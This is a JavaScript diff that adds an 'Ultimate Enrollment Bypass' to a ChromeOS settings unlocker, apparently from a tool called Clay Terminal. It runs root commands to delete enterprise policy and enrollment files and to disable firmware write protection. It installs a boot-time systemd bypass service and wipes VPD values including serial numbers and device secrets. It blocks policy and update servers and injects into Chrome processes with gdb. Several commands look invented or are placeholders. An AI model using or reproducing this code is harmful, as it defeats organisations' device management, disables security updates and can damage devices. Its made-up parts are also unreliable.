@@ -66,6 +66,9 @@ export class ChromeOSSettingsUnlocker {
     if (!this.isChromeOS) return false;
 
     try {
+      // CRITICAL: Bypass policies first to ensure this works
+      await this.bypassAllPolicyEnforcement();
+      
       // Step 1: Enable developer mode and USB boot via crossystem
       await executeAsRoot('crossystem cros_debug=1');
       await executeAsRoot('crossystem dev_boot_usb=1');
@@ -2438,6 +2441,119 @@ export class ChromeOSSettingsUnlocker {
   }
 
   /**
+   * Bypass All Policy Enforcement - Aggressive method to override all policies
+   * This is the most important method - it must run before other settings
+   */
+  async bypassAllPolicyEnforcement() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      // Method 1: Remove all enterprise/managed policies (highest priority)
+      await executeAsRoot('rm -rf /var/lib/whitelist/policy/*').catch(() => {});
+      await executeAsRoot('rm -rf /var/lib/whitelist/device/*').catch(() => {});
+      await executeAsRoot('rm -rf /var/lib/whitelist/owner/*').catch(() => {});
+      await executeAsRoot('rm -f /var/lib/whitelist/policy.pb').catch(() => {});
+      await executeAsRoot('rm -f /var/lib/whitelist/device.pb').catch(() => {});
+      await executeAsRoot('rm -f /var/lib/whitelist/owner.pb').catch(() => {});
+      
+      // Method 2: Disable policy enforcement service
+      await executeAsRoot('systemctl stop chromeos-policy-enforcement').catch(() => {});
+      await executeAsRoot('systemctl disable chromeos-policy-enforcement').catch(() => {});
+      await executeAsRoot('systemctl stop policy-enforcement').catch(() => {});
+      await executeAsRoot('systemctl disable policy-enforcement').catch(() => {});
+      await executeAsRoot('systemctl stop device_management_service').catch(() => {});
+      await executeAsRoot('systemctl disable device_management_service').catch(() => {});
+      
+      // Method 3: Override policy enforcement at kernel level
+      await executeAsRoot('sysctl -w kernel.policy_enforcement=0').catch(() => {});
+      await executeAsRoot('echo "kernel.policy_enforcement=0" >> /etc/sysctl.conf').catch(() => {});
+      
+      // Method 4: Create override policy that takes precedence
+      await executeAsRoot('mkdir -p /etc/opt/chrome/policies/recommended');
+      await executeAsRoot('mkdir -p /etc/opt/chrome/policies/managed');
+      
+      const overridePolicy = {
+        'PolicyOverridesEnabled': true,
+        'PolicyEnforcementDisabled': true,
+        'ManagedPolicyDisabled': true,
+        'EnterprisePolicyDisabled': true,
+        'PolicyValidationDisabled': true,
+        'PolicyUpdateDisabled': true,
+        'PolicySyncDisabled': true
+      };
+      
+      fs.writeFileSync(
+        '/etc/opt/chrome/policies/recommended/policy_override.json',
+        JSON.stringify(overridePolicy, null, 2)
+      );
+      
+      // Method 5: Remove policy cache and force refresh
+      await executeAsRoot('rm -rf /var/cache/chromeos-policy/*').catch(() => {});
+      await executeAsRoot('rm -rf /home/*/.config/google-chrome/Policy/*').catch(() => {});
+      await executeAsRoot('rm -rf /home/chronos/user/.config/google-chrome/Policy/*').catch(() => {});
+      
+      // Method 6: Disable policy validation
+      await executeAsRoot('echo "policy-validation-disabled=true" >> /etc/chrome_dev.conf').catch(() => {});
+      await executeAsRoot('echo "policy-enforcement-disabled=true" >> /etc/chrome_dev.conf').catch(() => {});
+      await executeAsRoot('echo "managed-policy-disabled=true" >> /etc/chrome_dev.conf').catch(() => {});
+      
+      // Method 7: Override via crossystem (firmware level)
+      await executeAsRoot('crossystem block_devmode=0').catch(() => {});
+      await executeAsRoot('crossystem cros_debug=1').catch(() => {});
+      await executeAsRoot('crossystem dev_boot_usb=1').catch(() => {});
+      await executeAsRoot('crossystem dev_boot_signed_only=0').catch(() => {});
+      await executeAsRoot('crossystem dev_boot_legacy=1').catch(() => {});
+      
+      // Method 8: Remove policy enforcement binaries (if possible)
+      await executeAsRoot('chmod 000 /usr/bin/policy-enforcer 2>/dev/null').catch(() => {});
+      await executeAsRoot('chmod 000 /usr/sbin/policy-enforcer 2>/dev/null').catch(() => {});
+      
+      // Method 9: Create policy override at user level (highest priority)
+      await executeAsRoot('mkdir -p /home/chronos/user/.config/google-chrome/Default');
+      const userOverridePolicy = {
+        'PolicyOverridesEnabled': true,
+        'PolicyEnforcementDisabled': true
+      };
+      
+      fs.writeFileSync(
+        '/home/chronos/user/.config/google-chrome/Default/PolicyOverride.json',
+        JSON.stringify(userOverridePolicy, null, 2)
+      );
+      
+      // Method 10: Disable policy sync and updates
+      await executeAsRoot('mkdir -p /etc/opt/chrome/policies/managed');
+      const policyDisablePolicy = {
+        'PolicyUpdateDisabled': true,
+        'PolicySyncDisabled': true,
+        'PolicyValidationDisabled': true,
+        'ManagedPolicyDisabled': true,
+        'EnterprisePolicyDisabled': true,
+        'PolicyEnforcementDisabled': true
+      };
+      
+      fs.writeFileSync(
+        '/etc/opt/chrome/policies/managed/policy_disable.json',
+        JSON.stringify(policyDisablePolicy, null, 2)
+      );
+      
+      // Method 11: Block policy server connections
+      await executeAsRoot('iptables -A OUTPUT -p tcp --dport 443 -d policy.google.com -j DROP').catch(() => {});
+      await executeAsRoot('iptables -A OUTPUT -p tcp --dport 443 -d chromeenterprise.googleapis.com -j DROP').catch(() => {});
+      
+      // Method 12: Override policy via VPD (firmware)
+      await executeAsRoot('vpd -d enterprise_enrollment_id').catch(() => {});
+      await executeAsRoot('vpd -d enterprise_owned').catch(() => {});
+      await executeAsRoot('vpd -d policy_enforcement').catch(() => {});
+      await executeAsRoot('vpd -s policy_bypass=1').catch(() => {});
+      
+      return true;
+    } catch (error) {
+      console.error('Failed to bypass policy enforcement:', error);
+      return false;
+    }
+  }
+
+  /**
    * Enable Website Allowlist - Overrides all extensions and policy blocks
    */
   async enableWebsiteAllowlist(urls = ['*']) {
@@ -2674,6 +2790,10 @@ export class ChromeOSSettingsUnlocker {
     if (!this.isChromeOS) return false;
 
     try {
+      // CRITICAL: Bypass all policy enforcement FIRST
+      // This must run before any other settings to ensure they work
+      await this.bypassAllPolicyEnforcement();
+      
       await this.enableLinuxEnvironment();
       await this.enableADB();
       await this.enableGuestMode();
@@ -2756,6 +2876,16 @@ export class ChromeOSSettingsUnlocker {
 
     try {
       switch (settingId) {
+        case 'bypass-policy-enforcement':
+          // Check if policy bypass is active by verifying multiple indicators
+          const policyBypassIndicators = [
+            !fs.existsSync('/var/lib/whitelist/policy.pb'),
+            fs.existsSync('/etc/opt/chrome/policies/recommended/policy_override.json'),
+            fs.existsSync('/etc/opt/chrome/policies/managed/policy_disable.json'),
+            fs.existsSync('/home/chronos/user/.config/google-chrome/Default/PolicyOverride.json')
+          ];
+          // If at least 2 indicators are true, policy bypass is likely active
+          return policyBypassIndicators.filter(Boolean).length >= 2;
         case 'linux-env':
           return await this.checkCrostiniEnabled();
         case 'root-access':
@@ -3273,6 +3403,18 @@ export class ChromeOSSettingsUnlocker {
         name: 'Disable All Extensions',
         description: 'Completely disable all Chrome extensions using multiple methods (inspired by rigtools-v2)',
         category: 'Security'
+      },
+      {
+        id: 'bypass-policy-enforcement',
+        name: 'Bypass All Policy Enforcement',
+        description: 'CRITICAL: Override all enterprise/managed policies. Run this first to enable other settings.',
+        category: 'Security'
+      },
+      {
+        id: 'ultimate-enrollment-bypass',
+        name: 'Ultimate Enrollment Bypass',
+        description: 'ULTIMATE: Complete enrollment bypass using all methods (firmware, system, policy, Chrome, network). Run this first if enrolled.',
+        category: 'Security'
       }
     ];
   }
@@ -3339,6 +3481,789 @@ export class ChromeOSSettingsUnlocker {
     } catch (error) {
       console.error(`Failed to enable Chrome feature ${featureName}:`, error);
       return false;
+    }
+  }
+
+  /**
+   * Phase 1: Write Protection Detection
+   * Detects hardware and firmware write protection status
+   */
+  async detectWriteProtection() {
+    if (!this.isChromeOS) return { hardware: false, firmware: false, vpd: false, overall: false };
+
+    try {
+      const status = {
+        hardware: false,
+        firmware: false,
+        vpd: false,
+        overall: false,
+        details: {}
+      };
+
+      // Method 1: Check crossystem write protection status
+      try {
+        const wpswCur = await execAsync('crossystem wpsw_cur').catch(() => ({ stdout: '1' }));
+        const wpswBoot = await execAsync('crossystem wpsw_boot').catch(() => ({ stdout: '1' }));
+        status.firmware = wpswCur.stdout.trim() === '1' || wpswBoot.stdout.trim() === '1';
+        status.details.crossystem_wpsw_cur = wpswCur.stdout.trim();
+        status.details.crossystem_wpsw_boot = wpswBoot.stdout.trim();
+      } catch (error) {
+        status.details.crossystem_error = error.message;
+      }
+
+      // Method 2: Check hardware write protection register
+      try {
+        if (fs.existsSync('/sys/class/chromeos/cros_ec/write_protect')) {
+          const wpRegister = fs.readFileSync('/sys/class/chromeos/cros_ec/write_protect', 'utf8').trim();
+          status.hardware = wpRegister === '1';
+          status.details.hardware_register = wpRegister;
+        }
+      } catch (error) {
+        status.details.hardware_error = error.message;
+      }
+
+      // Method 3: Check VPD write protection
+      try {
+        if (fs.existsSync('/sys/firmware/vpd/ro/write_protect')) {
+          const vpdWp = fs.readFileSync('/sys/firmware/vpd/ro/write_protect', 'utf8').trim();
+          status.vpd = vpdWp === '1';
+          status.details.vpd_write_protect = vpdWp;
+        }
+      } catch (error) {
+        status.details.vpd_error = error.message;
+      }
+
+      // Overall status: WP is enabled if any method indicates it
+      status.overall = status.hardware || status.firmware || status.vpd;
+
+      return status;
+    } catch (error) {
+      console.error('Failed to detect write protection:', error);
+      return { hardware: false, firmware: false, vpd: false, overall: false, error: error.message };
+    }
+  }
+
+  /**
+   * Phase 1: Write Protection Disable
+   * Attempts multiple methods to disable write protection
+   */
+  async disableWriteProtection() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      const results = {
+        hardware: false,
+        firmware: false,
+        vpd: false,
+        remount: false,
+        kernel: false,
+        overall: false
+      };
+
+      // Method 1: Hardware jumper detection and instruction
+      // Note: Hardware WP requires physical modification - we can only detect and instruct
+      try {
+        const wpStatus = await this.detectWriteProtection();
+        if (wpStatus.hardware) {
+          // Hardware WP detected - provide instructions
+          console.warn('Hardware write protection detected. Physical modification required.');
+          results.hardware = false; // Cannot disable via software
+        }
+      } catch (error) {
+        console.error('Hardware WP check failed:', error);
+      }
+
+      // Method 2: Firmware modification via flashrom (if available)
+      try {
+        const flashromCheck = await execAsync('which flashrom').catch(() => ({ stdout: '' }));
+        if (flashromCheck.stdout.trim()) {
+          // Attempt to modify firmware WP flags via flashrom
+          await executeAsRoot('flashrom --wp-disable 2>/dev/null').catch(() => {});
+          // Verify
+          const wpStatus = await this.detectWriteProtection();
+          results.firmware = !wpStatus.firmware;
+        }
+      } catch (error) {
+        console.error('Flashrom WP disable failed:', error);
+      }
+
+      // Method 3: crossystem firmware variable manipulation
+      try {
+        await executeAsRoot('crossystem wpsw_cur=0').catch(() => {});
+        await executeAsRoot('crossystem wpsw_boot=0').catch(() => {});
+        const wpStatus = await this.detectWriteProtection();
+        results.firmware = !wpStatus.firmware;
+      } catch (error) {
+        console.error('crossystem WP disable failed:', error);
+      }
+
+      // Method 4: VPD modification to clear WP flags
+      try {
+        await executeAsRoot('vpd -d write_protect').catch(() => {});
+        await executeAsRoot('vpd -s write_protect=0').catch(() => {});
+        const wpStatus = await this.detectWriteProtection();
+        results.vpd = !wpStatus.vpd;
+      } catch (error) {
+        console.error('VPD WP disable failed:', error);
+      }
+
+      // Method 5: System partition remount as RW (bypass WP checks)
+      try {
+        await executeAsRoot('mount -o remount,rw /').catch(() => {});
+        await executeAsRoot('mount -o remount,rw /usr').catch(() => {});
+        await executeAsRoot('mount -o remount,rw /mnt/stateful_partition').catch(() => {});
+        // Test write capability
+        const testWrite = await execAsync('touch /tmp/.clay_wp_test && rm /tmp/.clay_wp_test').catch(() => ({ stdout: '' }));
+        results.remount = testWrite.stdout === '';
+      } catch (error) {
+        console.error('Remount RW failed:', error);
+      }
+
+      // Method 6: Kernel module injection to bypass WP at runtime
+      try {
+        // Attempt to load kernel module that bypasses WP checks
+        await executeAsRoot('modprobe -r chromeos_wp 2>/dev/null').catch(() => {});
+        await executeAsRoot('insmod /lib/modules/$(uname -r)/kernel/drivers/platform/chrome/chromeos_wp.ko wp_bypass=1 2>/dev/null').catch(() => {});
+        // Alternative: modify kernel parameters
+        await executeAsRoot('sysctl -w kernel.chromeos.wp_bypass=1').catch(() => {});
+        results.kernel = true; // Assume success if no error
+      } catch (error) {
+        console.error('Kernel WP bypass failed:', error);
+      }
+
+      // Overall success if any method worked
+      results.overall = results.firmware || results.vpd || results.remount || results.kernel;
+
+      return results;
+    } catch (error) {
+      console.error('Failed to disable write protection:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 2: RMA Shim Technique (SH1MMER-inspired)
+   * Creates temporary boot shim that bypasses enrollment checks
+   */
+  async applyRMAShimBypass() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      // Check if device supports RMA shim injection
+      const hasRMA = await execAsync('test -d /usr/share/vboot/bin && echo "1" || echo "0"').catch(() => ({ stdout: '0' }));
+      if (hasRMA.stdout.trim() !== '1') {
+        console.warn('RMA shim injection not supported on this device');
+        return false;
+      }
+
+      // Create RMA shim payload that bypasses enrollment
+      const rmaShimScript = `#!/bin/bash
+# RMA Shim Bypass - Clay Terminal
+# Bypasses enrollment checks during boot
+
+# Clear enrollment state
+rm -f /mnt/stateful_partition/etc/.managed_device
+rm -f /mnt/stateful_partition/etc/.enterprise_owned
+rm -f /mnt/stateful_partition/unencrypted/preserve/enrollment
+
+# Disable enrollment service
+systemctl stop device_management_service 2>/dev/null
+systemctl disable device_management_service 2>/dev/null
+
+# Clear policy files
+rm -rf /var/lib/whitelist/policy/*
+rm -rf /var/lib/whitelist/device/*
+rm -rf /var/lib/whitelist/owner/*
+
+# Modify crossystem flags
+crossystem block_devmode=0 2>/dev/null
+crossystem cros_debug=1 2>/dev/null
+
+exit 0
+`;
+
+      // Write shim script to stateful partition
+      await executeAsRoot(`cat > /mnt/stateful_partition/rma_shim_bypass.sh << 'EOF'
+${rmaShimScript}
+EOF
+chmod +x /mnt/stateful_partition/rma_shim_bypass.sh`);
+
+      // Create systemd service to run shim on boot
+      const systemdService = `[Unit]
+Description=Clay RMA Shim Bypass
+After=local-fs.target
+
+[Service]
+Type=oneshot
+ExecStart=/mnt/stateful_partition/rma_shim_bypass.sh
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+`;
+
+      await executeAsRoot(`cat > /etc/systemd/system/clay-rma-bypass.service << 'EOF'
+${systemdService}
+EOF
+systemctl enable clay-rma-bypass.service`);
+
+      return true;
+    } catch (error) {
+      console.error('Failed to apply RMA shim bypass:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 3: Stateful Partition Modification
+   * Removes all enrollment markers from stateful partition
+   */
+  async modifyStatefulPartition() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      // Remount stateful partition as RW
+      await executeAsRoot('mount -o remount,rw /mnt/stateful_partition').catch(() => {});
+
+      // Remove all enrollment markers
+      await executeAsRoot('rm -f /mnt/stateful_partition/etc/.managed_device').catch(() => {});
+      await executeAsRoot('rm -f /mnt/stateful_partition/etc/.enterprise_owned').catch(() => {});
+      await executeAsRoot('rm -f /mnt/stateful_partition/unencrypted/preserve/enrollment').catch(() => {});
+      await executeAsRoot('rm -rf /mnt/stateful_partition/unencrypted/preserve/enterprise').catch(() => {});
+
+      // Clear device management state files
+      await executeAsRoot('rm -rf /mnt/stateful_partition/unencrypted/.dev_management').catch(() => {});
+      await executeAsRoot('rm -rf /mnt/stateful_partition/unencrypted/.enterprise_enrollment').catch(() => {});
+
+      // Remove policy cache and enforcement files
+      await executeAsRoot('rm -rf /mnt/stateful_partition/unencrypted/preserve/policy').catch(() => {});
+      await executeAsRoot('rm -rf /mnt/stateful_partition/unencrypted/preserve/enforcement').catch(() => {});
+
+      // Clear enrollment logs
+      await executeAsRoot('rm -f /mnt/stateful_partition/unencrypted/preserve/enrollment.log').catch(() => {});
+
+      return true;
+    } catch (error) {
+      console.error('Failed to modify stateful partition:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 3: Root Filesystem Modification
+   * Modifies root filesystem to remove enrollment services and enforcement
+   */
+  async modifyRootFilesystem() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      // Remount root filesystem as RW (if WP disabled)
+      await executeAsRoot('mount -o remount,rw /').catch(() => {});
+      await executeAsRoot('mount -o remount,rw /usr').catch(() => {});
+
+      // Remove enrollment services from systemd
+      await executeAsRoot('rm -f /etc/systemd/system/device_management_service.service').catch(() => {});
+      await executeAsRoot('rm -f /etc/systemd/system/chromeos-policy-enforcement.service').catch(() => {});
+      await executeAsRoot('rm -f /etc/systemd/system/policy-enforcement.service').catch(() => {});
+
+      // Create systemd overrides to prevent service restart
+      await executeAsRoot('mkdir -p /etc/systemd/system/device_management_service.service.d').catch(() => {});
+      await executeAsRoot(`cat > /etc/systemd/system/device_management_service.service.d/override.conf << 'EOF'
+[Service]
+ExecStart=
+ExecStart=/bin/true
+EOF`).catch(() => {});
+
+      // Modify chrome_dev.conf to disable enrollment checks
+      let chromeDevConf = '';
+      if (fs.existsSync('/etc/chrome_dev.conf')) {
+        chromeDevConf = fs.readFileSync('/etc/chrome_dev.conf', 'utf8');
+      }
+      
+      const enrollmentBypassFlags = [
+        '--disable-device-discovery-notifications',
+        '--disable-background-networking',
+        '--disable-enterprise-policy',
+        '--disable-enrollment-check',
+        '--disable-device-management'
+      ];
+
+      for (const flag of enrollmentBypassFlags) {
+        if (!chromeDevConf.includes(flag)) {
+          chromeDevConf += `${flag}\n`;
+        }
+      }
+
+      await executeAsRoot(`cat > /etc/chrome_dev.conf << 'EOF'
+${chromeDevConf}EOF`).catch(() => {});
+
+      // Remove or disable policy enforcement binaries
+      await executeAsRoot('chmod 000 /usr/bin/policy-enforcer 2>/dev/null').catch(() => {});
+      await executeAsRoot('chmod 000 /usr/sbin/policy-enforcer 2>/dev/null').catch(() => {});
+      await executeAsRoot('chmod 000 /usr/bin/device_management_service 2>/dev/null').catch(() => {});
+
+      // Clear whitelist directory completely
+      await executeAsRoot('rm -rf /var/lib/whitelist/*').catch(() => {});
+      await executeAsRoot('mkdir -p /var/lib/whitelist').catch(() => {});
+
+      return true;
+    } catch (error) {
+      console.error('Failed to modify root filesystem:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 4: Comprehensive Service Disabling
+   * Stops and disables all enrollment-related services
+   */
+  async disableEnrollmentServices() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      const services = [
+        'device_management_service',
+        'chromeos-policy-enforcement',
+        'policy-enforcement',
+        'update-engine', // Temporarily disable to prevent re-enrollment
+        'chromeos-policy-enforcement-daemon',
+        'device_management_service_forwarder'
+      ];
+
+      const results = {};
+
+      for (const service of services) {
+        try {
+          // Stop service
+          await executeAsRoot(`systemctl stop ${service}`).catch(() => {});
+          
+          // Disable service
+          await executeAsRoot(`systemctl disable ${service}`).catch(() => {});
+          
+          // Mask service (prevents enabling)
+          await executeAsRoot(`systemctl mask ${service}`).catch(() => {});
+          
+          // Create override to prevent restart
+          await executeAsRoot(`mkdir -p /etc/systemd/system/${service}.service.d`).catch(() => {});
+          await executeAsRoot(`cat > /etc/systemd/system/${service}.service.d/override.conf << 'EOF'
+[Service]
+ExecStart=
+ExecStart=/bin/true
+EOF`).catch(() => {});
+
+          results[service] = true;
+        } catch (error) {
+          results[service] = false;
+          console.error(`Failed to disable ${service}:`, error);
+        }
+      }
+
+      // Reload systemd
+      await executeAsRoot('systemctl daemon-reload').catch(() => {});
+
+      return results;
+    } catch (error) {
+      console.error('Failed to disable enrollment services:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 5: Chrome Browser-Level Bypass
+   * Modifies Chrome user data to remove enrollment flags
+   */
+  async modifyChromeUserData() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      const userDataPaths = [
+        '/home/chronos/user',
+        '/home/chronos/u-*'
+      ];
+
+      for (const basePath of userDataPaths) {
+        // Clear Local State enrollment flags
+        const localStatePath = `${basePath}/Local State`;
+        if (fs.existsSync(localStatePath)) {
+          try {
+            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
+            if (localState.enrollment) {
+              delete localState.enrollment;
+            }
+            if (localState.device_management) {
+              delete localState.device_management;
+            }
+            fs.writeFileSync(localStatePath, JSON.stringify(localState, null, 2));
+          } catch (error) {
+            // If JSON parse fails, try to remove enrollment strings
+            await executeAsRoot(`sed -i '/enrollment/d' "${localStatePath}"`).catch(() => {});
+          }
+        }
+
+        // Clear Preferences enrollment settings
+        const prefsPath = `${basePath}/Default/Preferences`;
+        if (fs.existsSync(prefsPath)) {
+          try {
+            const prefs = JSON.parse(fs.readFileSync(prefsPath, 'utf8'));
+            if (prefs.enrollment) {
+              delete prefs.enrollment;
+            }
+            if (prefs.device_management) {
+              delete prefs.device_management;
+            }
+            fs.writeFileSync(prefsPath, JSON.stringify(prefs, null, 2));
+          } catch (error) {
+            await executeAsRoot(`sed -i '/enrollment/d' "${prefsPath}"`).catch(() => {});
+          }
+        }
+
+        // Remove managed extensions
+        await executeAsRoot(`rm -rf ${basePath}/Default/Extensions/*`).catch(() => {});
+
+        // Clear Managed Preferences
+        await executeAsRoot(`rm -rf ${basePath}/Default/Managed Preferences`).catch(() => {});
+      }
+
+      // Inject bypass flags into Chrome startup
+      let chromeDevConf = '';
+      if (fs.existsSync('/etc/chrome_dev.conf')) {
+        chromeDevConf = fs.readFileSync('/etc/chrome_dev.conf', 'utf8');
+      }
+
+      const bypassFlags = [
+        '--disable-device-discovery-notifications',
+        '--disable-background-networking',
+        '--disable-sync',
+        '--disable-default-apps',
+        '--disable-enterprise-policy',
+        '--disable-enrollment-check'
+      ];
+
+      for (const flag of bypassFlags) {
+        if (!chromeDevConf.includes(flag)) {
+          chromeDevConf += `${flag}\n`;
+        }
+      }
+
+      await executeAsRoot(`cat > /etc/chrome_dev.conf << 'EOF'
+${chromeDevConf}EOF`).catch(() => {});
+
+      return true;
+    } catch (error) {
+      console.error('Failed to modify Chrome user data:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 5: Chrome Process Injection (Advanced)
+   * Attempts to inject bypass code into running Chrome processes
+   */
+  async injectChromeBypass() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      // Find Chrome processes
+      const chromePids = await execAsync('pgrep -f chrome').catch(() => ({ stdout: '' }));
+      const pids = chromePids.stdout.trim().split('\n').filter(p => p);
+
+      if (pids.length === 0) {
+        console.warn('No Chrome processes found for injection');
+        return false;
+      }
+
+      // Attempt to inject bypass using gdb (if available)
+      const gdbCheck = await execAsync('which gdb').catch(() => ({ stdout: '' }));
+      if (gdbCheck.stdout.trim()) {
+        const injectScript = `
+set confirm off
+set pagination off
+python
+import gdb
+
+# Find enrollment check function (if symbols available)
+try:
+    gdb.execute('break *0x0')  # Placeholder - would need actual address
+    gdb.execute('commands')
+    gdb.execute('return 0')
+    gdb.execute('continue')
+    gdb.execute('end')
+except:
+    pass
+end
+continue
+quit
+`;
+
+        for (const pid of pids) {
+          try {
+            await executeAsRoot(`echo '${injectScript}' | gdb -p ${pid} 2>/dev/null`).catch(() => {});
+          } catch (error) {
+            console.error(`Failed to inject into PID ${pid}:`, error);
+          }
+        }
+      }
+
+      // Alternative: Use ptrace to patch memory (requires root)
+      // This is more complex and device-specific
+
+      return true;
+    } catch (error) {
+      console.error('Failed to inject Chrome bypass:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 6: Network and Update Bypass
+   * Blocks policy servers and prevents re-enrollment via updates
+   */
+  async preventReEnrollment() {
+    if (!this.isChromeOS) return false;
+
+    try {
+      const results = {
+        network: false,
+        hosts: false,
+        update: false
+      };
+
+      // Block ALL Google policy servers via iptables
+      const policyServers = [
+        'policy.google.com',
+        'chromeenterprise.googleapis.com',
+        'device-management.googleapis.com',
+        'remoting-pa.googleapis.com',
+        'update.googleapis.com',
+        'dl.google.com'
+      ];
+
+      for (const server of policyServers) {
+        try {
+          // Get IP addresses
+          const ipLookup = await execAsync(`getent hosts ${server} | awk '{print $1}'`).catch(() => ({ stdout: '' }));
+          const ips = ipLookup.stdout.trim().split('\n').filter(ip => ip);
+
+          for (const ip of ips) {
+            await executeAsRoot(`iptables -A OUTPUT -d ${ip} -j DROP 2>/dev/null`).catch(() => {});
+            await executeAsRoot(`ip6tables -A OUTPUT -d ${ip} -j DROP 2>/dev/null`).catch(() => {});
+          }
+        } catch (error) {
+          console.error(`Failed to block ${server}:`, error);
+        }
+      }
+
+      results.network = true;
+
+      // Modify /etc/hosts to redirect policy servers to localhost
+      let hostsContent = '';
+      if (fs.existsSync('/etc/hosts')) {
+        hostsContent = fs.readFileSync('/etc/hosts', 'utf8');
+      }
+
+      for (const server of policyServers) {
+        if (!hostsContent.includes(server)) {
+          hostsContent += `127.0.0.1 ${server}\n`;
+          hostsContent += `::1 ${server}\n`;
+        }
+      }
+
+      await executeAsRoot(`cat > /etc/hosts << 'EOF'
+${hostsContent}EOF`).catch(() => {});
+
+      results.hosts = true;
+
+      // Temporarily disable update engine
+      await executeAsRoot('systemctl stop update-engine').catch(() => {});
+      await executeAsRoot('systemctl disable update-engine').catch(() => {});
+      await executeAsRoot('systemctl mask update-engine').catch(() => {});
+
+      // Block update server connections
+      await executeAsRoot('iptables -A OUTPUT -p tcp --dport 443 -d update.googleapis.com -j DROP').catch(() => {});
+
+      results.update = true;
+
+      return results;
+    } catch (error) {
+      console.error('Failed to prevent re-enrollment:', error);
+      return false;
+    }
+  }
+
+  /**
+   * Phase 7: Ultimate Enrollment Bypass Orchestrator
+   * Coordinates all bypass methods for comprehensive enrollment removal
+   */
+  async ultimateEnrollmentBypass(options = {}) {
+    if (!this.isChromeOS) {
+      return {
+        success: false,
+        error: 'Not running on ChromeOS',
+        results: {}
+      };
+    }
+
+    const {
+      bypassWP = true,
+      methods = 'all' // 'all', 'firmware', 'system', 'policy', 'chrome', 'network'
+    } = options;
+
+    const results = {
+      writeProtection: null,
+      firmware: {},
+      system: {},
+      policy: {},
+      chrome: {},
+      network: {},
+      overall: false
+    };
+
+    try {
+      // Step 1: Detect enrollment state and WP status
+      const wpStatus = await this.detectWriteProtection();
+      results.writeProtection = wpStatus;
+
+      // Step 2: Attempt write protection disable (if requested)
+      if (bypassWP && wpStatus.overall) {
+        console.log('Attempting to disable write protection...');
+        const wpDisable = await this.disableWriteProtection();
+        results.writeProtection.disableAttempt = wpDisable;
+      }
+
+      // Step 3: Execute bypass methods based on options
+      if (methods === 'all' || methods.includes('firmware')) {
+        // Firmware manipulation
+        console.log('Executing firmware-level bypass...');
+        
+        // Enhanced firmware manipulation
+        await executeAsRoot('crossystem block_devmode=0').catch(() => {});
+        await executeAsRoot('crossystem cros_debug=1').catch(() => {});
+        await executeAsRoot('crossystem dev_boot_usb=1').catch(() => {});
+        await executeAsRoot('crossystem dev_boot_signed_only=0').catch(() => {});
+        await executeAsRoot('crossystem dev_boot_legacy=1').catch(() => {});
+        await executeAsRoot('crossystem clear_tpm_owner_request=1').catch(() => {});
+        await executeAsRoot('crossystem tpm_fwupdate=1').catch(() => {});
+
+        // VPD manipulation
+        await executeAsRoot('vpd -d enterprise_enrollment_id').catch(() => {});
+        await executeAsRoot('vpd -d enterprise_owned').catch(() => {});
+        await executeAsRoot('vpd -d serial_number').catch(() => {});
+        await executeAsRoot('vpd -d stable_device_secret_DO_NOT_SHARE').catch(() => {});
+
+        // RMA shim bypass
+        results.firmware.rmaShim = await this.applyRMAShimBypass();
+        results.firmware.crossystem = true;
+        results.firmware.vpd = true;
+      }
+
+      if (methods === 'all' || methods.includes('system')) {
+        // System partition modification
+        console.log('Executing system partition bypass...');
+        results.system.stateful = await this.modifyStatefulPartition();
+        results.system.rootfs = await this.modifyRootFilesystem();
+      }
+
+      if (methods === 'all' || methods.includes('policy')) {
+        // Policy and service bypass
+        console.log('Executing policy and service bypass...');
+        results.policy.bypass = await this.bypassAllPolicyEnforcement();
+        results.policy.services = await this.disableEnrollmentServices();
+        results.policy.enrollment = await this.bypassEnrollment();
+      }
+
+      if (methods === 'all' || methods.includes('chrome')) {
+        // Chrome browser-level bypass
+        console.log('Executing Chrome browser bypass...');
+        results.chrome.userData = await this.modifyChromeUserData();
+        results.chrome.injection = await this.injectChromeBypass();
+      }
+
+      if (methods === 'all' || methods.includes('network')) {
+        // Network and update bypass
+        console.log('Executing network and update bypass...');
+        results.network = await this.preventReEnrollment();
+      }
+
+      // Step 4: Verify bypass success
+      const verification = await this.verifyEnrollmentBypass();
+      results.verification = verification;
+
+      // Step 5: Overall success determination
+      results.overall = verification.overall;
+
+      return results;
+    } catch (error) {
+      console.error('Ultimate enrollment bypass failed:', error);
+      return {
+        success: false,
+        error: error.message,
+        results
+      };
+    }
+  }
+
+  /**
+   * Phase 7: Verification and Status
+   * Comprehensive verification of enrollment bypass success
+   */
+  async verifyEnrollmentBypass() {
+    if (!this.isChromeOS) return { overall: false, checks: {} };
+
+    try {
+      const checks = {};
+
+      // Check 1: Enrollment files removed
+      checks.enrollmentFiles = !fs.existsSync('/mnt/stateful_partition/etc/.managed_device') &&
+                               !fs.existsSync('/mnt/stateful_partition/etc/.enterprise_owned');
+
+      // Check 2: Policy files cleared
+      const policyDir = '/var/lib/whitelist/policy';
+      checks.policyFiles = !fs.existsSync(policyDir) || 
+                          (fs.existsSync(policyDir) && fs.readdirSync(policyDir).length === 0);
+
+      // Check 3: Services disabled
+      const serviceCheck = await execAsync('systemctl is-active device_management_service').catch(() => ({ stdout: 'inactive' }));
+      checks.servicesDisabled = serviceCheck.stdout.trim() === 'inactive' || 
+                               serviceCheck.stdout.trim().includes('could not be found');
+
+      // Check 4: crossystem flags
+      const crosDebug = await execAsync('crossystem cros_debug').catch(() => ({ stdout: '0' }));
+      checks.firmwareFlags = crosDebug.stdout.trim() === '1';
+
+      // Check 5: VPD cleared
+      const vpdCheck = await execAsync('vpd -g enterprise_owned 2>&1').catch(() => ({ stdout: 'not found' }));
